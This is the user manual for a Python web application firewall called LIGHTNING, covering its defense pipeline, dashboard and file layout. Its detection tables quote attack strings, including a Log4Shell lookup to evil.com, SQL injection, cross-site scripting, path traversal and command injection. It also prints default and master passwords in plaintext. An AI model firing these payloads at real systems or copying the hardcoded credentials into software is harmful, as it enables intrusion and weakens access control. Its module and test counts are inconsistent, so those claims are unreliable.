# ⚡ LIGHTNING - Complete User Manual & Architectural Blueprint
### **CREATED BY NEXO-TECH BY ALEXANDER**

---

## 📖 Table of Contents
1. [Introduction & Overview](#1-introduction--overview)
2. [What Makes LIGHTNING a 10/10 Defense System](#2-what-makes-lightning-a-1010-defense-system)
3. [How LIGHTNING Works Under the Hood](#3-how-lightning-works-under-the-hood)
4. [Step-by-Step Usage Guide](#4-step-by-step-usage-guide)
   - [Starting the Application (Single-Command)](#starting-the-application-single-command)
   - [Web SOC Command Center & Automatic Browser Redirect](#web-soc-command-center--automatic-browser-redirect)
   - [Web SOC Dashboard Authentication](#web-soc-dashboard-authentication)
   - [Live Threat Intelligence Feeds](#live-threat-intelligence-feeds)
   - [Persistent SQLite Storage Engine](#persistent-sqlite-storage-engine)
   - [SSL/TLS Certificate Manager (HTTPS Support)](#ssltls-certificate-manager-https-support)
   - [Menu Modules & Operation Modes](#menu-modules--operation-modes)
   - [Automated 13-Module Unit Test Suite](#automated-13-module-unit-test-suite)
   - [Testing & Attack Simulation](#testing--attack-simulation)
5. [👑 LIGHTNING PREMIUM // Brutal Continuous Radar](#5-lightning-premium--brutal-continuous-radar)
6. [Deep Breakdown of Every File & Sub-File](#6-deep-breakdown-of-every-file--sub-file)
7. [Threat Categories & Defense Signatures](#7-threat-categories--defense-signatures)
8. [Real-World Deployment Scenarios](#8-real-world-deployment-scenarios)
9. [Troubleshooting & FAQs](#9-troubleshooting--faqs)

---

## 1. Introduction & Overview

**LIGHTNING** is an enterprise-grade autonomous cyber defense engine designed to guard websites, REST/GraphQL APIs, web servers, and databases against cyberattacks in real time.

Unlike traditional passive log analyzers, LIGHTNING provides:
- **Active Interception**: Sits in front of your applications as a reverse-proxy Web Application Firewall (WAF) to drop malicious payloads before they reach your backend.
- **Deep Packet Inspection**: Scans URLs, query parameters, HTTP headers, authentication tokens, cookies, and POST/PUT JSON/multipart bodies.
- **Automated Web SOC & Terminal Dual Output**: Live streaming telemetry to both a **color-coded terminal feed** and a **futuristic Web SOC Command Center (`http://127.0.0.1:8888`)** that automatically opens in Google Chrome / your default browser.
- **Zero External Dependencies**: Operates completely using Python 3.8+ standard library.

---

## 2. What Makes LIGHTNING a 10/10 Defense System

| # | Enterprise Upgrade | Module | Description |
|:---|:---|:---|:---|
| **1** | **Native SSL/TLS & HTTPS Proxy** | `core/ssl_manager.py` | Automatic self-signed X.509 certificate generator & custom PEM loader for full HTTPS proxy termination. |
| **2** | **Persistent SQLite Storage** | `core/persistence.py` | High-performance WAL-mode SQLite database (`lightning_data.db`) storing threats, bans, and metrics across reboots. |
| **3** | **Live Global Threat Intel Feeds** | `core/threat_feeds.py` | Auto-syncs with FireHOL, Emerging Threats, Blocklist.de, and CI Army with 10,000+ known malicious IPs. |
| **4** | **Web SOC Authentication Guard** | `core/dashboard_auth.py` | Cyberpunk login portal and secure cryptographic session cookies (`LIGHTNING_SESSION`) protecting your dashboard. |
| **5** | **Automated 13-Module Test Suite** | `tests/test_lightning.py` | Complete automated unit test suite with 50/50 test coverage verifying every subsystem. |

---

## 3. How LIGHTNING Works Under the Hood

### The Request Lifecycle & Defense Pipeline

```
[ Client / Attacker / Scanner ]
               │
               ▼
┌────────────────────────────────────────────────────────┐
│  STAGE 1: Blacklist & Dynamic Quarantine Check         │
│  - Is IP in quarantine? -> DROP (403)                  │
└──────────────────────┬─────────────────────────────────┘
                       │ (Passed)
                       ▼
┌────────────────────────────────────────────────────────┐
│  STAGE 1b: Live Global Threat Intelligence Feed Check  │
│  - Is IP in 10,000+ global attacker database? -> DROP  │
└──────────────────────┬─────────────────────────────────┘
                       │ (Passed)
                       ▼
┌────────────────────────────────────────────────────────┐
│  STAGE 2: Geo-Fencing & Tor Network Interceptor        │
│  - Country in blocked list? -> DROP (403)              │
│  - Tor Exit Node or malicious proxy? -> DROP (403)     │
└──────────────────────┬─────────────────────────────────┘
                       │ (Passed)
                       ▼
┌────────────────────────────────────────────────────────┐
│  STAGE 3: Active Honeypot Decoy Trap Check             │
│  - Path matches decoy (/admin_login.php, /.aws/)?      │
│  -> YES: Trap triggered, IP auto-banned permanently!    │
└──────────────────────┬─────────────────────────────────┘
                       │ (Passed)
                       ▼
┌────────────────────────────────────────────────────────┐
│  STAGE 4: Anti-DDoS Rate Limit Check                   │
│  - Request count in 10s window > threshold? -> BAN (429)│
└──────────────────────┬─────────────────────────────────┘
                       │ (Passed)
                       ▼
┌────────────────────────────────────────────────────────┐
│  STAGE 5: User-Agent & Scanner Signature Check         │
│  - Matches sqlmap, nikto, gobuster, nmap, hydra?       │
│  -> YES: Serve 403 Forbidden, Alert Terminal & SOC     │
└──────────────────────┬─────────────────────────────────┘
                       │ (Passed)
                       ▼
┌────────────────────────────────────────────────────────┐
│  STAGE 6: Multipart File Upload & Web Shell Scanner    │
│  - Double extensions (avatar.php.jpg)? Null-bytes?     │
│  - PHP/JSP webshells, executable magic bytes (MZ, ELF)?│
└──────────────────────┬─────────────────────────────────┘
                       │ (Passed)
                       ▼
┌────────────────────────────────────────────────────────┐
│  STAGE 7: Virtual Patching & Zero-Day CVE Shield       │
│  - Log4Shell (${jndi:ldap://}), Spring4Shell, PHP-CGI  │
│  - Hot-reloaded custom rules from custom_rules.json    │
└──────────────────────┬─────────────────────────────────┘
                       │ (Passed)
                       ▼
┌────────────────────────────────────────────────────────┐
│  STAGE 8: API Gateway & Auth Token Inspection          │
│  - JWT check: alg='none' exploit? missing signature?   │
│  - GraphQL check: query depth > limit? __schema probe? │
│  - BOLA check: rapid sequential resource ID scraping?  │
│  - API Key enforcement: valid X-API-Key?               │
└──────────────────────┬─────────────────────────────────┘
                       │ (Passed)
                       ▼
┌────────────────────────────────────────────────────────┐
│  STAGE 9: Web & Database Exploit Inspection (URI/Body) │
│  - SQL Injection: UNION, boolean OR 1=1, sleep()       │
│  - NoSQL Injection: MongoDB $gt, $ne, $where           │
│  - Cross-Site Scripting (XSS): <script>, svg, onerror  │
│  - Remote Code Execution: ;, |, ``, powershell, whoami │
│  - Path Traversal: ../, /etc/shadow, win.ini           │
│  - Sensitive File Probe: /.env, /.git, wp-config       │
└──────────────────────┬─────────────────────────────────┘
                       │ (Passed)
                       ▼
┌────────────────────────────────────────────────────────┐
│  STAGE 10: Behavioral Risk Scoring & Anti-Bot Armor     │
│  - Risk score 35-69: Serve Proof-of-Work challenge     │
│  - Risk score 70+: Instant block + auto-ban            │
└──────────────────────┬─────────────────────────────────┘
                       │ (Passed)
                       ▼
┌────────────────────────────────────────────────────────┐
│  STAGE 11: Proxying & Outbound Data Loss Prevention    │
│  - Forwards safe request to your real backend web app  │
│  - Inspects response and redacts leaked Credit Cards,  │
│    AWS Keys (AKIA...), and SSH private keys            │
│  - Injects hardening headers (CSP, HSTS, X-Frame)      │
└────────────────────────────────────────────────────────┘
```

---

## 4. Step-by-Step Usage Guide

### Starting the Application (Single-Command)

On **Windows**, double-click:
```
run.bat
```
Or run:
```bash
python main.py
```
*(Press `Enter` on the prompt to launch the All-In-One Master Engine)*

---

### Web SOC Command Center & Automatic Browser Redirect

When started, LIGHTNING **automatically launches Google Chrome / your default browser** and opens:
👉 **`http://127.0.0.1:8888`**

#### Dashboard Features:
1. **Target Website Header**: Displays your protected target URL, shield gateway, DOM Hash Integrity (`✔ 100% INTACT`), and response latency (ms).
2. **Animated Circular Security Gauge**: Shows your website's **Security Score (`98% GRADE A+`)**.
3. **Live Telemetry Cards**: System Uptime, Total Inspected Requests, Blocked Attacks, Active Quarantines, and DLP Secrets Masked.
4. **Real-Time Security Incident Stream**: Streaming table showing every blocked exploit with glowing badges.
5. **Attack Vector Distribution**: Visual animated gradient bars breaking down threat categories.
6. **Active IP Quarantine Manager**: Real-time table of banned attacker IPs with countdown timers and a one-click **"Unban IP"** button.
7. **"🚀 Fire Test Threat" Button**: Built right into the top navigation bar to test live animations with one click!

---

### Web SOC Dashboard Authentication
The Web SOC Dashboard is protected by a session-based login system (`core/dashboard_auth.py`):
- **Default Username**: `admin`
- **Default Password**: `lightning`
*(You can customize credentials anytime via Settings Option `[6]`)*

---

### 📱 Running LIGHTNING on Termux (Android Mobile SOC)

LIGHTNING is engineered with **zero external heavy dependencies** (100% Python standard library), making it run natively and smoothly on **Android via Termux** as a portable mobile SOC command center!

#### 1. Setup in Termux:
```bash
# Update packages and install Python & Git
pkg update && pkg install python git -y

# Navigate to your Lightning folder
cd Lightning

# Optional: Keep Termux CPU active in background
termux-wake-lock
```

#### 2. Start LIGHTNING in Termux:
```bash
# Launch the Master Autonomous Defense Engine
python main.py
```
*(Press `Enter` to select Option `[1]` All-in-One Engine)*

#### 3. Accessing the Web SOC Dashboard on Android:
- **On your Android Device (Phone / Tablet)**:
  Open Chrome, Kiwi Browser, or Firefox and go to:
  👉 **`http://127.0.0.1:8888`** *(or `http://localhost:8888`)*
  - **Login**: `admin` / `lightning`
  
- **From your PC or another device on the same Wi-Fi**:
  1. In Termux, check your phone's IP: `ifconfig` (look for `wlan0` inet e.g., `192.168.1.45`)
  2. Open your PC browser and navigate to:
     👉 **`http://192.168.1.45:8888`**

#### 4. WAF Proxy Gateway on Android:
- Your WAF reverse proxy listens on `http://127.0.0.1:8080` (or `http://0.0.0.0:8080`).
- Route any local web apps or remote traffic through port `8080` to protect them!

---

### Automated 14-Module Unit Test Suite
To verify the entire defense stack:
```bash
python tests/test_lightning.py
# or select option [T] in main.py
```
**Result**: 63/63 automated test assertions across all 14 defense subsystems pass in ~0.5 seconds with 100% operational score!

---

## 5. 👑 LIGHTNING PREMIUM // Brutal Continuous Radar

### Master Cryptographic Key:
- **Plaintext Password**: `ALEXANDER@$LINUX{K}SHELL-DEV`
- **Cryptographic SHA-256 Hash**: `d0f2587b646d43e32f4d2c3696dc780f453f5d6586b44ea7dd15759aec7b5e6d`

### ⚡ Brutal Radar Capabilities:
1. **Sector Alpha**: Docker API (`2375`), Kubernetes API (`6443`), etcd (`2379`), Consul (`8500`), RabbitMQ (`15672`).
2. **Sector Bravo**: Redis (`6379`), MongoDB (`27017`), Elasticsearch (`9200`), Memcached (`11211`), MySQL, Postgres.
3. **Sector Charlie**: RDP (`3389`), Telnet (`23`), VNC (`5900`), FTP (`21`).
4. **Sector Delta**: Secret Endpoints (`/actuator/env`, `/swagger-ui.html`, `/debug/pprof/`, `/server-status`, `/.env`, `/.git/config`).
5. **Zero-Tolerance Auto-Ban**: 24-hour instant auto-bans on first strike.

---

## 6. Deep Breakdown of Every File & Sub-File

```
Lightning/
├── main.py              # Main dashboard CLI & single-file Master Engine entry point
├── banner.py            # ASCII art & NEXO-TECH BY ALEXANDER styling
├── config.py            # Interactive setup wizard (Web, IP, Port, API, DB, Geo, DLP)
├── custom_rules.json    # Hot-reloading zero-day custom regex rules
├── simulate_attacks.py  # 13+ scenario enterprise penetration test suite
├── requirements.txt     # Dependency definitions
├── run.bat              # One-click Windows batch launcher
├── README.md            # Quickstart overview
├── GUIDE.md             # Complete user guide and architectural blueprint
├── lightning_config.json# Saved configuration file
├── lightning_security.log# Threat intelligence audit log
├── lightning_data.db    # SQLite persistent database (threats, bans, metrics)
├── tests/
│   ├── __init__.py      # Test package initializer
│   └── test_lightning.py# Automated 13-module 50-test unit test suite
└── core/
    ├── __init__.py      # Core package initializer
    ├── ssl_manager.py   # SSL/TLS self-signed cert manager & HTTPS proxy support
    ├── persistence.py   # SQLite persistent database engine (WAL-mode)
    ├── threat_feeds.py  # Live threat intelligence feed aggregator (10,000+ IPs)
    ├── dashboard_auth.py# Session token auth & cyberpunk login portal
    ├── premium.py       # Premium authentication & master key SHA-256 verification
    ├── radar.py         # Brutal Continuous Radar & 4-sector surface threat hunter
    ├── engine.py        # Master Autonomous Defense Engine orchestrator
    ├── rules.py         # Threat signatures (SQLi, NoSQL, XSS, RCE, LFI, DB, DLP)
    ├── waf_proxy.py     # Reverse proxy firewall & deep packet inspector
    ├── anti_bot.py      # Interactive CAPTCHA & Proof-of-Work challenge armor
    ├── malware_scanner.py# Multipart file upload & webshell detector
    ├── virtual_patching.py# Log4Shell, Spring4Shell, and CVE virtual patches
    ├── geo_intelligence.py# IP geolocation, geo-fencing & Tor exit node interceptor
    ├── heuristic_scorer.py# Behavioral threat risk scoring engine (0-100)
    ├── quarantine.py    # Dynamic IP quarantine & whitelist manager
    ├── soc_dashboard.py # Real-time Web SOC Dashboard on port 8888
    ├── api_shield.py    # API Gateway (JWT, GraphQL, BOLA, API Keys)
    ├── db_monitor.py    # Database connection & query rule sentinel
    ├── dlp.py           # Outbound Data Loss Prevention secret scrubber
    ├── honeypot.py      # Active decoy trap engine & auto-banner
    ├── monitor.py       # Live website integrity, defacement & SSL watcher
    ├── scanner.py       # Port & security vulnerability auditor (Score A-F)
    ├── log_ids.py       # Real-time access log IDS engine
    └── notifier.py      # Terminal alert engine with colors, sound & webhooks
```

---

## 7. Threat Categories & Defense Signatures

| Category | Example Exploits Caught | Action Taken |
| :--- | :--- | :--- |
| **Log4Shell** | `${jndi:ldap://evil.com/a}` | **Blocked (403) + Audio Beep + SQLite Log** |
| **Spring4Shell** | `class.module.classLoader.URLs[0]=...` | **Blocked (403) + Audio Beep + SQLite Log** |
| **PHP-CGI** | `%ADd+allow_url_include%3d1` | **Blocked (403) + Audio Beep + SQLite Log** |
| **SQL Injection** | `' OR '1'='1'`, `UNION SELECT ... FROM users` | **Blocked (403) + Audio Beep + SQLite Log** |
| **NoSQL Injection** | `user[$gt]=`, `$where: "..."` | **Blocked (403) + Audio Beep + SQLite Log** |
| **Web Shell Upload**| `eval(base64_decode(...))`, `.php.jpg` | **Blocked (403) + Audio Beep + SQLite Log** |
| **Cross-Site Scripting**| `<script>alert(1)</script>`, `<svg onload=...>`| **Blocked (403) + Audio Beep + SQLite Log** |
| **Remote Code Exec** | `127.0.0.1; whoami`, `powershell.exe -c` | **Blocked (403) + Audio Beep + SQLite Log** |
| **Path Traversal** | `../../../../etc/passwd`, `win.ini` | **Blocked (403) + Audio Beep + SQLite Log** |
| **Threat Intel Match**| Known IP from FireHOL / EmergingThreats | **Instant Drop (403) + Flagged** |
| **Tor / Proxy** | Tor exit nodes, anonymous proxies | **Blocked (403) + Audio Beep** |
| **Anti-DDoS Flood** | > 60 requests in 10 seconds | **Temporary Ban (429 Too Many Requests)**|
| **Data Loss Prevention**| Leaked Credit Cards, AWS Keys (`AKIA...`) | **Sanitized / Redacted in Response** |

---

## 🛡️ Summary & Credits
**LIGHTNING** was engineered by **NEXO-TECH BY ALEXANDER** to deliver full, 10/10 autonomous cyber defense for websites, APIs, and databases.
